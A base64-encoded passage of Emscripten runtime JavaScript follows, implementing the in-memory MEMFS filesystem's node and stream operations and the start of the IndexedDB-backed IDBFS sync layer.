LAogICAgICAgICAgICAgICAgICAgICAgICBzZXRhdHRyOiBNRU1GUy5ub2RlX29wcy5zZXRhdHRyLAogICAgICAgICAgICAgICAgICAgICAgICByZWFkbGluazogTUVNRlMubm9kZV9vcHMucmVhZGxpbmsKICAgICAgICAgICAgICAgICAgICB9LCBzdHJlYW06IHt9CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgY2hyZGV2OiB7CiAgICAgICAgICAgICAgICAgICAgbm9kZToge2dldGF0dHI6IE1FTUZTLm5vZGVfb3BzLmdldGF0dHIsIHNldGF0dHI6IE1FTUZTLm5vZGVfb3BzLnNldGF0dHJ9LAogICAgICAgICAgICAgICAgICAgIHN0cmVhbTogRlMuY2hyZGV2X3N0cmVhbV9vcHMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICB2YXIgbm9kZSA9IEZTLmNyZWF0ZU5vZGUocGFyZW50LCBuYW1lLCBtb2RlLCBkZXYpOwogICAgICAgIGlmKEZTLmlzRGlyKG5vZGUubW9kZSkpIHsKICAgICAgICAgICAgbm9kZS5ub2RlX29wcyA9IE1FTUZTLm9wc190YWJsZS5kaXIubm9kZTsKICAgICAgICAgICAgbm9kZS5zdHJlYW1fb3BzID0gTUVNRlMub3BzX3RhYmxlLmRpci5zdHJlYW07CiAgICAgICAgICAgIG5vZGUuY29udGVudHMgPSB7fQogICAgICAgIH0gZWxzZSBpZihGUy5pc0ZpbGUobm9kZS5tb2RlKSkgewogICAgICAgICAgICBub2RlLm5vZGVfb3BzID0gTUVNRlMub3BzX3RhYmxlLmZpbGUubm9kZTsKICAgICAgICAgICAgbm9kZS5zdHJlYW1fb3BzID0gTUVNRlMub3BzX3RhYmxlLmZpbGUuc3RyZWFtOwogICAgICAgICAgICBub2RlLnVzZWRCeXRlcyA9IDA7CiAgICAgICAgICAgIG5vZGUuY29udGVudHMgPSBudWxsCiAgICAgICAgfSBlbHNlIGlmKEZTLmlzTGluayhub2RlLm1vZGUpKSB7CiAgICAgICAgICAgIG5vZGUubm9kZV9vcHMgPSBNRU1GUy5vcHNfdGFibGUubGluay5ub2RlOwogICAgICAgICAgICBub2RlLnN0cmVhbV9vcHMgPSBNRU1GUy5vcHNfdGFibGUubGluay5zdHJlYW0KICAgICAgICB9IGVsc2UgaWYoRlMuaXNDaHJkZXYobm9kZS5tb2RlKSkgewogICAgICAgICAgICBub2RlLm5vZGVfb3BzID0gTUVNRlMub3BzX3RhYmxlLmNocmRldi5ub2RlOwogICAgICAgICAgICBub2RlLnN0cmVhbV9vcHMgPSBNRU1GUy5vcHNfdGFibGUuY2hyZGV2LnN0cmVhbQogICAgICAgIH0KICAgICAgICBub2RlLnRpbWVzdGFtcCA9IERhdGUubm93KCk7CiAgICAgICAgaWYocGFyZW50KSB7CiAgICAgICAgICAgIHBhcmVudC5jb250ZW50c1tuYW1lXSA9IG5vZGUKICAgICAgICB9CiAgICAgICAgcmV0dXJuIG5vZGUKICAgIH0pLCBnZXRGaWxlRGF0YUFzUmVndWxhckFycmF5OiAoZnVuY3Rpb24obm9kZSkgewogICAgICAgIGlmKG5vZGUuY29udGVudHMgJiYgbm9kZS5jb250ZW50cy5zdWJhcnJheSkgewogICAgICAgICAgICB2YXIgYXJyID0gW107CiAgICAgICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCBub2RlLnVzZWRCeXRlczsgKytpKSBhcnIucHVzaChub2RlLmNvbnRlbnRzW2ldKTsKICAgICAgICAgICAgcmV0dXJuIGFycgogICAgICAgIH0KICAgICAgICByZXR1cm4gbm9kZS5jb250ZW50cwogICAgfSksIGdldEZpbGVEYXRhQXNUeXBlZEFycmF5OiAoZnVuY3Rpb24obm9kZSkgewogICAgICAgIGlmKCFub2RlLmNvbnRlbnRzKSByZXR1cm4gbmV3IFVpbnQ4QXJyYXk7CiAgICAgICAgaWYobm9kZS5jb250ZW50cy5zdWJhcnJheSkgcmV0dXJuIG5vZGUuY29udGVudHMuc3ViYXJyYXkoMCwgbm9kZS51c2VkQnl0ZXMpOwogICAgICAgIHJldHVybiBuZXcgVWludDhBcnJheShub2RlLmNvbnRlbnRzKQogICAgfSksIGV4cGFuZEZpbGVTdG9yYWdlOiAoZnVuY3Rpb24obm9kZSwgbmV3Q2FwYWNpdHkpIHsKICAgICAgICBpZihub2RlLmNvbnRlbnRzICYmIG5vZGUuY29udGVudHMuc3ViYXJyYXkgJiYgbmV3Q2FwYWNpdHkgPiBub2RlLmNvbnRlbnRzLmxlbmd0aCkgewogICAgICAgICAgICBub2RlLmNvbnRlbnRzID0gTUVNRlMuZ2V0RmlsZURhdGFBc1JlZ3VsYXJBcnJheShub2RlKTsKICAgICAgICAgICAgbm9kZS51c2VkQnl0ZXMgPSBub2RlLmNvbnRlbnRzLmxlbmd0aAogICAgICAgIH0KICAgICAgICBpZighbm9kZS5jb250ZW50cyB8fCBub2RlLmNvbnRlbnRzLnN1YmFycmF5KSB7CiAgICAgICAgICAgIHZhciBwcmV2Q2FwYWNpdHkgPSBub2RlLmNvbnRlbnRzID8gbm9kZS5jb250ZW50cy5sZW5ndGggOiAwOwogICAgICAgICAgICBpZihwcmV2Q2FwYWNpdHkgPj0gbmV3Q2FwYWNpdHkpIHJldHVybjsKICAgICAgICAgICAgdmFyIENBUEFDSVRZX0RPVUJMSU5HX01BWCA9IDEwMjQgKiAxMDI0OwogICAgICAgICAgICBuZXdDYXBhY2l0eSA9IE1hdGgubWF4KG5ld0NhcGFjaXR5LCBwcmV2Q2FwYWNpdHkgKiAocHJldkNhcGFjaXR5IDwgQ0FQQUNJVFlfRE9VQkxJTkdfTUFYID8gMiA6IDEuMTI1KSB8IDApOwogICAgICAgICAgICBpZihwcmV2Q2FwYWNpdHkgIT0gMCkgbmV3Q2FwYWNpdHkgPSBNYXRoLm1heChuZXdDYXBhY2l0eSwgMjU2KTsKICAgICAgICAgICAgdmFyIG9sZENvbnRlbnRzID0gbm9kZS5jb250ZW50czsKICAgICAgICAgICAgbm9kZS5jb250ZW50cyA9IG5ldyBVaW50OEFycmF5KG5ld0NhcGFjaXR5KTsKICAgICAgICAgICAgaWYobm9kZS51c2VkQnl0ZXMgPiAwKSBub2RlLmNvbnRlbnRzLnNldChvbGRDb250ZW50cy5zdWJhcnJheSgwLCBub2RlLnVzZWRCeXRlcyksIDApOwogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CiAgICAgICAgaWYoIW5vZGUuY29udGVudHMgJiYgbmV3Q2FwYWNpdHkgPiAwKSBub2RlLmNvbnRlbnRzID0gW107CiAgICAgICAgd2hpbGUobm9kZS5jb250ZW50cy5sZW5ndGggPCBuZXdDYXBhY2l0eSkgbm9kZS5jb250ZW50cy5wdXNoKDApCiAgICB9KSwgcmVzaXplRmlsZVN0b3JhZ2U6IChmdW5jdGlvbihub2RlLCBuZXdTaXplKSB7CiAgICAgICAgaWYobm9kZS51c2VkQnl0ZXMgPT0gbmV3U2l6ZSkgcmV0dXJuOwogICAgICAgIGlmKG5ld1NpemUgPT0gMCkgewogICAgICAgICAgICBub2RlLmNvbnRlbnRzID0gbnVsbDsKICAgICAgICAgICAgbm9kZS51c2VkQnl0ZXMgPSAwOwogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CiAgICAgICAgaWYoIW5vZGUuY29udGVudHMgfHwgbm9kZS5jb250ZW50cy5zdWJhcnJheSkgewogICAgICAgICAgICB2YXIgb2xkQ29udGVudHMgPSBub2RlLmNvbnRlbnRzOwogICAgICAgICAgICBub2RlLmNvbnRlbnRzID0gbmV3IFVpbnQ4QXJyYXkobmV3IEFycmF5QnVmZmVyKG5ld1NpemUpKTsKICAgICAgICAgICAgaWYob2xkQ29udGVudHMpIHsKICAgICAgICAgICAgICAgIG5vZGUuY29udGVudHMuc2V0KG9sZENvbnRlbnRzLnN1YmFycmF5KDAsIE1hdGgubWluKG5ld1NpemUsIG5vZGUudXNlZEJ5dGVzKSkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgbm9kZS51c2VkQnl0ZXMgPSBuZXdTaXplOwogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CiAgICAgICAgaWYoIW5vZGUuY29udGVudHMpIG5vZGUuY29udGVudHMgPSBbXTsKICAgICAgICBpZihub2RlLmNvbnRlbnRzLmxlbmd0aCA+IG5ld1NpemUpIG5vZGUuY29udGVudHMubGVuZ3RoID0gbmV3U2l6ZTsgZWxzZSB3aGlsZShub2RlLmNvbnRlbnRzLmxlbmd0aCA8IG5ld1NpemUpIG5vZGUuY29udGVudHMucHVzaCgwKTsKICAgICAgICBub2RlLnVzZWRCeXRlcyA9IG5ld1NpemUKICAgIH0pLCBub2RlX29wczogewogICAgICAgIGdldGF0dHI6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgICAgIHZhciBhdHRyID0ge307CiAgICAgICAgICAgIGF0dHIuZGV2ID0gRlMuaXNDaHJkZXYobm9kZS5tb2RlKSA/IG5vZGUuaWQgOiAxOwogICAgICAgICAgICBhdHRyLmlubyA9IG5vZGUuaWQ7CiAgICAgICAgICAgIGF0dHIubW9kZSA9IG5vZGUubW9kZTsKICAgICAgICAgICAgYXR0ci5ubGluayA9IDE7CiAgICAgICAgICAgIGF0dHIudWlkID0gMDsKICAgICAgICAgICAgYXR0ci5naWQgPSAwOwogICAgICAgICAgICBhdHRyLnJkZXYgPSBub2RlLnJkZXY7CiAgICAgICAgICAgIGlmKEZTLmlzRGlyKG5vZGUubW9kZSkpIHsKICAgICAgICAgICAgICAgIGF0dHIuc2l6ZSA9IDQwOTYKICAgICAgICAgICAgfSBlbHNlIGlmKEZTLmlzRmlsZShub2RlLm1vZGUpKSB7CiAgICAgICAgICAgICAgICBhdHRyLnNpemUgPSBub2RlLnVzZWRCeXRlcwogICAgICAgICAgICB9IGVsc2UgaWYoRlMuaXNMaW5rKG5vZGUubW9kZSkpIHsKICAgICAgICAgICAgICAgIGF0dHIuc2l6ZSA9IG5vZGUubGluay5sZW5ndGgKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGF0dHIuc2l6ZSA9IDAKICAgICAgICAgICAgfQogICAgICAgICAgICBhdHRyLmF0aW1lID0gbmV3IERhdGUobm9kZS50aW1lc3RhbXApOwogICAgICAgICAgICBhdHRyLm10aW1lID0gbmV3IERhdGUobm9kZS50aW1lc3RhbXApOwogICAgICAgICAgICBhdHRyLmN0aW1lID0gbmV3IERhdGUobm9kZS50aW1lc3RhbXApOwogICAgICAgICAgICBhdHRyLmJsa3NpemUgPSA0MDk2OwogICAgICAgICAgICBhdHRyLmJsb2NrcyA9IE1hdGguY2VpbChhdHRyLnNpemUgLyBhdHRyLmJsa3NpemUpOwogICAgICAgICAgICByZXR1cm4gYXR0cgogICAgICAgIH0pLCBzZXRhdHRyOiAoZnVuY3Rpb24obm9kZSwgYXR0cikgewogICAgICAgICAgICBpZihhdHRyLm1vZGUgIT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgbm9kZS5tb2RlID0gYXR0ci5tb2RlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoYXR0ci50aW1lc3RhbXAgIT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgbm9kZS50aW1lc3RhbXAgPSBhdHRyLnRpbWVzdGFtcAogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKGF0dHIuc2l6ZSAhPT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICBNRU1GUy5yZXNpemVGaWxlU3RvcmFnZShub2RlLCBhdHRyLnNpemUpCiAgICAgICAgICAgIH0KICAgICAgICB9KSwgbG9va3VwOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lKSB7CiAgICAgICAgICAgIHRocm93IEZTLmdlbmVyaWNFcnJvcnNbRVJSTk9fQ09ERVMuRU5PRU5UXQogICAgICAgIH0pLCBta25vZDogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSwgbW9kZSwgZGV2KSB7CiAgICAgICAgICAgIHJldHVybiBNRU1GUy5jcmVhdGVOb2RlKHBhcmVudCwgbmFtZSwgbW9kZSwgZGV2KQogICAgICAgIH0pLCByZW5hbWU6IChmdW5jdGlvbihvbGRfbm9kZSwgbmV3X2RpciwgbmV3X25hbWUpIHsKICAgICAgICAgICAgaWYoRlMuaXNEaXIob2xkX25vZGUubW9kZSkpIHsKICAgICAgICAgICAgICAgIHZhciBuZXdfbm9kZTsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgbmV3X25vZGUgPSBGUy5sb29rdXBOb2RlKG5ld19kaXIsIG5ld19uYW1lKQogICAgICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZihuZXdfbm9kZSkgewogICAgICAgICAgICAgICAgICAgIGZvcih2YXIgaSBpbiBuZXdfbm9kZS5jb250ZW50cykgewogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9URU1QVFkpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGRlbGV0ZSBvbGRfbm9kZS5wYXJlbnQuY29udGVudHNbb2xkX25vZGUubmFtZV07CiAgICAgICAgICAgIG9sZF9ub2RlLm5hbWUgPSBuZXdfbmFtZTsKICAgICAgICAgICAgbmV3X2Rpci5jb250ZW50c1tuZXdfbmFtZV0gPSBvbGRfbm9kZTsKICAgICAgICAgICAgb2xkX25vZGUucGFyZW50ID0gbmV3X2RpcgogICAgICAgIH0pLCB1bmxpbms6IChmdW5jdGlvbihwYXJlbnQsIG5hbWUpIHsKICAgICAgICAgICAgZGVsZXRlIHBhcmVudC5jb250ZW50c1tuYW1lXQogICAgICAgIH0pLCBybWRpcjogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgewogICAgICAgICAgICB2YXIgbm9kZSA9IEZTLmxvb2t1cE5vZGUocGFyZW50LCBuYW1lKTsKICAgICAgICAgICAgZm9yKHZhciBpIGluIG5vZGUuY29udGVudHMpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT1RFTVBUWSkKICAgICAgICAgICAgfQogICAgICAgICAgICBkZWxldGUgcGFyZW50LmNvbnRlbnRzW25hbWVdCiAgICAgICAgfSksIHJlYWRkaXI6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgICAgIHZhciBlbnRyaWVzID0gWyIuIiwgIi4uIl07CiAgICAgICAgICAgIGZvcih2YXIga2V5IGluIG5vZGUuY29udGVudHMpIHsKICAgICAgICAgICAgICAgIGlmKCFub2RlLmNvbnRlbnRzLmhhc093blByb3BlcnR5KGtleSkpIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZW50cmllcy5wdXNoKGtleSkKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZW50cmllcwogICAgICAgIH0pLCBzeW1saW5rOiAoZnVuY3Rpb24ocGFyZW50LCBuZXduYW1lLCBvbGRwYXRoKSB7CiAgICAgICAgICAgIHZhciBub2RlID0gTUVNRlMuY3JlYXRlTm9kZShwYXJlbnQsIG5ld25hbWUsIDUxMSB8IDQwOTYwLCAwKTsKICAgICAgICAgICAgbm9kZS5saW5rID0gb2xkcGF0aDsKICAgICAgICAgICAgcmV0dXJuIG5vZGUKICAgICAgICB9KSwgcmVhZGxpbms6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgICAgIGlmKCFGUy5pc0xpbmsobm9kZS5tb2RlKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBub2RlLmxpbmsKICAgICAgICB9KQogICAgfSwgc3RyZWFtX29wczogewogICAgICAgIHJlYWQ6IChmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvc2l0aW9uKSB7CiAgICAgICAgICAgIHZhciBjb250ZW50cyA9IHN0cmVhbS5ub2RlLmNvbnRlbnRzOwogICAgICAgICAgICBpZihwb3NpdGlvbiA+PSBzdHJlYW0ubm9kZS51c2VkQnl0ZXMpIHJldHVybiAwOwogICAgICAgICAgICB2YXIgc2l6ZSA9IE1hdGgubWluKHN0cmVhbS5ub2RlLnVzZWRCeXRlcyAtIHBvc2l0aW9uLCBsZW5ndGgpOwogICAgICAgICAgICBhc3NlcnQoc2l6ZSA+PSAwKTsKICAgICAgICAgICAgaWYoc2l6ZSA+IDggJiYgY29udGVudHMuc3ViYXJyYXkpIHsKICAgICAgICAgICAgICAgIGJ1ZmZlci5zZXQoY29udGVudHMuc3ViYXJyYXkocG9zaXRpb24sIHBvc2l0aW9uICsgc2l6ZSksIG9mZnNldCkKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCBzaXplOyBpKyspIGJ1ZmZlcltvZmZzZXQgKyBpXSA9IGNvbnRlbnRzW3Bvc2l0aW9uICsgaV0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gc2l6ZQogICAgICAgIH0pLCB3cml0ZTogKGZ1bmN0aW9uKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24sIGNhbk93bikgewogICAgICAgICAgICBpZighbGVuZ3RoKSByZXR1cm4gMDsKICAgICAgICAgICAgdmFyIG5vZGUgPSBzdHJlYW0ubm9kZTsKICAgICAgICAgICAgbm9kZS50aW1lc3RhbXAgPSBEYXRlLm5vdygpOwogICAgICAgICAgICBpZihidWZmZXIuc3ViYXJyYXkgJiYgKCFub2RlLmNvbnRlbnRzIHx8IG5vZGUuY29udGVudHMuc3ViYXJyYXkpKSB7CiAgICAgICAgICAgICAgICBpZihjYW5Pd24pIHsKICAgICAgICAgICAgICAgICAgICBub2RlLmNvbnRlbnRzID0gYnVmZmVyLnN1YmFycmF5KG9mZnNldCwgb2Zmc2V0ICsgbGVuZ3RoKTsKICAgICAgICAgICAgICAgICAgICBub2RlLnVzZWRCeXRlcyA9IGxlbmd0aDsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbGVuZ3RoCiAgICAgICAgICAgICAgICB9IGVsc2UgaWYobm9kZS51c2VkQnl0ZXMgPT09IDAgJiYgcG9zaXRpb24gPT09IDApIHsKICAgICAgICAgICAgICAgICAgICBub2RlLmNvbnRlbnRzID0gbmV3IFVpbnQ4QXJyYXkoYnVmZmVyLnN1YmFycmF5KG9mZnNldCwgb2Zmc2V0ICsgbGVuZ3RoKSk7CiAgICAgICAgICAgICAgICAgICAgbm9kZS51c2VkQnl0ZXMgPSBsZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGxlbmd0aAogICAgICAgICAgICAgICAgfSBlbHNlIGlmKHBvc2l0aW9uICsgbGVuZ3RoIDw9IG5vZGUudXNlZEJ5dGVzKSB7CiAgICAgICAgICAgICAgICAgICAgbm9kZS5jb250ZW50cy5zZXQoYnVmZmVyLnN1YmFycmF5KG9mZnNldCwgb2Zmc2V0ICsgbGVuZ3RoKSwgcG9zaXRpb24pOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBsZW5ndGgKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBNRU1GUy5leHBhbmRGaWxlU3RvcmFnZShub2RlLCBwb3NpdGlvbiArIGxlbmd0aCk7CiAgICAgICAgICAgIGlmKG5vZGUuY29udGVudHMuc3ViYXJyYXkgJiYgYnVmZmVyLnN1YmFycmF5KSBub2RlLmNvbnRlbnRzLnNldChidWZmZXIuc3ViYXJyYXkob2Zmc2V0LCBvZmZzZXQgKyBsZW5ndGgpLCBwb3NpdGlvbik7IGVsc2UgewogICAgICAgICAgICAgICAgZm9yKHZhciBpID0gMDsgaSA8IGxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgbm9kZS5jb250ZW50c1twb3NpdGlvbiArIGldID0gYnVmZmVyW29mZnNldCArIGldCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbm9kZS51c2VkQnl0ZXMgPSBNYXRoLm1heChub2RlLnVzZWRCeXRlcywgcG9zaXRpb24gKyBsZW5ndGgpOwogICAgICAgICAgICByZXR1cm4gbGVuZ3RoCiAgICAgICAgfSksIGxsc2VlazogKGZ1bmN0aW9uKHN0cmVhbSwgb2Zmc2V0LCB3aGVuY2UpIHsKICAgICAgICAgICAgdmFyIHBvc2l0aW9uID0gb2Zmc2V0OwogICAgICAgICAgICBpZih3aGVuY2UgPT09IDEpIHsKICAgICAgICAgICAgICAgIHBvc2l0aW9uICs9IHN0cmVhbS5wb3NpdGlvbgogICAgICAgICAgICB9IGVsc2UgaWYod2hlbmNlID09PSAyKSB7CiAgICAgICAgICAgICAgICBpZihGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkpIHsKICAgICAgICAgICAgICAgICAgICBwb3NpdGlvbiArPSBzdHJlYW0ubm9kZS51c2VkQnl0ZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZihwb3NpdGlvbiA8IDApIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCkKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gcG9zaXRpb24KICAgICAgICB9KSwgYWxsb2NhdGU6IChmdW5jdGlvbihzdHJlYW0sIG9mZnNldCwgbGVuZ3RoKSB7CiAgICAgICAgICAgIE1FTUZTLmV4cGFuZEZpbGVTdG9yYWdlKHN0cmVhbS5ub2RlLCBvZmZzZXQgKyBsZW5ndGgpOwogICAgICAgICAgICBzdHJlYW0ubm9kZS51c2VkQnl0ZXMgPSBNYXRoLm1heChzdHJlYW0ubm9kZS51c2VkQnl0ZXMsIG9mZnNldCArIGxlbmd0aCkKICAgICAgICB9KSwgbW1hcDogKGZ1bmN0aW9uKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24sIHByb3QsIGZsYWdzKSB7CiAgICAgICAgICAgIGlmKCFGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkpIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT0RFVikKICAgICAgICAgICAgfQogICAgICAgICAgICB2YXIgcHRyOwogICAgICAgICAgICB2YXIgYWxsb2NhdGVkOwogICAgICAgICAgICB2YXIgY29udGVudHMgPSBzdHJlYW0ubm9kZS5jb250ZW50czsKICAgICAgICAgICAgaWYoIShmbGFncyAmIDIpICYmIChjb250ZW50cy5idWZmZXIgPT09IGJ1ZmZlciB8fCBjb250ZW50cy5idWZmZXIgPT09IGJ1ZmZlci5idWZmZXIpKSB7CiAgICAgICAgICAgICAgICBhbGxvY2F0ZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgIHB0ciA9IGNvbnRlbnRzLmJ5dGVPZmZzZXQKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmKHBvc2l0aW9uID4gMCB8fCBwb3NpdGlvbiArIGxlbmd0aCA8IHN0cmVhbS5ub2RlLnVzZWRCeXRlcykgewogICAgICAgICAgICAgICAgICAgIGlmKGNvbnRlbnRzLnN1YmFycmF5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRzID0gY29udGVudHMuc3ViYXJyYXkocG9zaXRpb24sIHBvc2l0aW9uICsgbGVuZ3RoKQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnRzID0gQXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoY29udGVudHMsIHBvc2l0aW9uLCBwb3NpdGlvbiArIGxlbmd0aCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBhbGxvY2F0ZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgcHRyID0gX21hbGxvYyhsZW5ndGgpOwogICAgICAgICAgICAgICAgaWYoIXB0cikgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVOT01FTSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJ1ZmZlci5zZXQoY29udGVudHMsIHB0cikKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4ge3B0cjogcHRyLCBhbGxvY2F0ZWQ6IGFsbG9jYXRlZH0KICAgICAgICB9KSwgbXN5bmM6IChmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIG1tYXBGbGFncykgewogICAgICAgICAgICBpZighRlMuaXNGaWxlKHN0cmVhbS5ub2RlLm1vZGUpKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9ERVYpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYobW1hcEZsYWdzICYgMikgewogICAgICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICAgICAgfQogICAgICAgICAgICB2YXIgYnl0ZXNXcml0dGVuID0gTUVNRlMuc3RyZWFtX29wcy53cml0ZShzdHJlYW0sIGJ1ZmZlciwgMCwgbGVuZ3RoLCBvZmZzZXQsIGZhbHNlKTsKICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICB9KQogICAgfQp9Owp2YXIgSURCRlMgPSB7CiAgICBkYnM6IHt9LCBpbmRleGVkREI6IChmdW5jdGlvbigpIHsKICAgICAgICBpZih0eXBlb2YgaW5kZXhlZERCICE9PSAidW5kZWZpbmVkIikgcmV0dXJuIGluZGV4ZWREQjsKICAgICAgICB2YXIgcmV0ID0gbnVsbDsKICAgICAgICBpZih0eXBlb2Ygd2luZG93ID09PSAib2JqZWN0IikgcmV0ID0gd2luZG93LmluZGV4ZWREQiB8fCB3aW5kb3cubW96SW5kZXhlZERCIHx8IHdpbmRvdy53ZWJraXRJbmRleGVkREIgfHwgd2luZG93Lm1zSW5kZXhlZERCOwogICAgICAgIGFzc2VydChyZXQsICJJREJGUyB1c2VkLCBidXQgaW5kZXhlZERCIG5vdCBzdXBwb3J0ZWQiKTsKICAgICAgICByZXR1cm4gcmV0CiAgICB9KSwgREJfVkVSU0lPTjogMjEsIERCX1NUT1JFX05BTUU6ICJGSUxFX0RBVEEiLCBtb3VudDogKGZ1bmN0aW9uKG1vdW50KSB7CiAgICAgICAgcmV0dXJuIE1FTUZTLm1vdW50LmFwcGx5KG51bGwsIGFyZ3VtZW50cykKICAgIH0pLCBzeW5jZnM6IChmdW5jdGlvbihtb3VudCwgcG9wdWxhdGUsIGNhbGxiYWNrKSB7CiAgICAgICAgSURCRlMuZ2V0TG9jYWxTZXQobW91bnQsIChmdW5jdGlvbihlcnIsIGxvY2FsKSB7CiAgICAgICAgICAgIGlmKGVycikgcmV0dXJuIGNhbGxiYWNrKGVycik7CiAgICAgICAgICAgIElEQkZTLmdldFJlbW90ZVNldChtb3VudCwgKGZ1bmN0aW9uKGVyciwgcmVtb3RlKSB7CiAgICAgICAgICAgICAgICBpZihlcnIpIHJldHVybiBjYWxsYmFjayhlcnIpOwogICAgICAgICAgICAgICAgdmFyIHNyYyA9IHBvcHVsYXRlID8gcmVtb3RlIDogbG9jYWw7CiAgICAgICAgICAgICAgICB2YXIgZHN0ID0gcG9wdWxhdGUgPyBsb2NhbCA6IHJlbW90ZTsKICAgICAgICAgICAgICAgIElEQkZTLnJlY29uY2lsZShzcmMsIGRzdCwgY2FsbGJhY2spCiAgICAgICAgICAgIH0pKQogICAgICAgIH0pKQogICAgfSksIGdldERCOiAoZnVuY3Rpb24obmFtZSwgY2FsbGJhY2spIHsKICAgICAgICB2YXIgZGIgPSBJREJGUy5kYnNbbmFtZV07CiAgICAgICAgaWYoZGIpIHsKICAgICAgICAgICAgcmV0dXJuIGNhbGxiYWNrKG51bGwsIGRiKQogICAgICAgIH0KICAgICAgICB2YXIgcmVxOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHJlcSA9IElEQkZTLmluZGV4ZWREQigpLm9wZW4obmFtZSwgSURCRlMuREJfVkVSU0lPTikKICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgcmV0dXJuIGNhbGxiYWNrKGUpCiAgICAgICAgfQogICAgICAgIGlmKCFyZXEpIHsKICAgICAgICAgICAgcmV0dXJuIGNhbGxiYWNrKCJVbmFibGUgdG8gY29ubmVjdCB0byBJbmRleGVkREIiKQogICAgICAgIH0KICAgICAgICByZXEub251cGdyYWRlbmVlZGVkID0gKGZ1bmN0aW9uKGUpIHsKICAgICAgICAgICAgdmFyIGRiID0gZS50YXJnZXQucmVzdWx0OwogICAgICAgICAgICB2YXIgdHJhbnNhY3Rpb24gPSBlLnRhcmdldC50cmFuc2FjdGlvbjsKICAgICAgICAgICAgdmFyIGZpbGVTdG9yZTsKICAgICAgICAgICAgaWYoZGIub2JqZWN0U3RvcmVOYW1lcy5jb250YWlucyhJREJGUy5EQl9TVE9SRV9OQU1FKSkgewogICAgICAgICAgICAgICAgZmlsZVN0b3JlID0gdHJhbnNhY3Rpb24ub2JqZWN0